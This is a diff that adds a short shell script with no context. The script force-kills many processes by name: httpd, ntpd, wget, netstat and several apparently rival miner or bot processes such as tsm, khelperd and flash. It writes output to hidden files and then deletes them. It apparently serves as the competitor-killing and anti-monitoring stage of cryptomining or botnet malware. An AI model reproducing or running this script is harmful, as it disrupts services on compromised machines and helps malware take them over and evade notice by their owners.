@@ -1,0 +1,31 @@
+#!/bin/sh
+killall -9 go>.out
+pkill -9 go>.out
+pkill -9 httpd>.out
+kill -9 `ps x|grep go|grep -v grep|awk '{print $1}'`>.out
+killall -9 tsm>.out
+killall -9 httpd>.out
+killall -9 /usr/sbin/http>.out
+killall -9 flash>.out
+pkill -9 flash>.out
+pkill -9 watch>.out
+kill -9 `ps x|grep flash|grep -v grep|awk '{print $1}'`>.out
+#kill -9 `ps x|grep run|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep go|grep -v grep|awk '{print $1}'`>.out
+kill -9 `ps x|grep tsm|grep -v grep|awk '{print $1}'`>.out
+kill -9 `ps x|grep ntpd|grep -v grep|awk '{print $1}'`>.out
+kill -9 `ps x|grep khelperd|grep -v grep|awk '{print $1}'`>.out
+#kill -9 `ps x|grep sleep|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep /usr/sbin/http|grep -v grep|awk '{print $1}'`>.out
+killall -9 wget>.out
+kill -9  `ps x|grep wget|awk '{print $1}'`>.out
+pkill -9 http>.out
+pkill -9 watch>.out
+pkill -9 tsm>.out
+pkill -9 httpd>.out
+pkill -9 go>.out
+pkill -9 ld-2.23>.out
+pkill -9 netstat>.out
+rm -rf .proc .out
+sleep 5
+exit 0
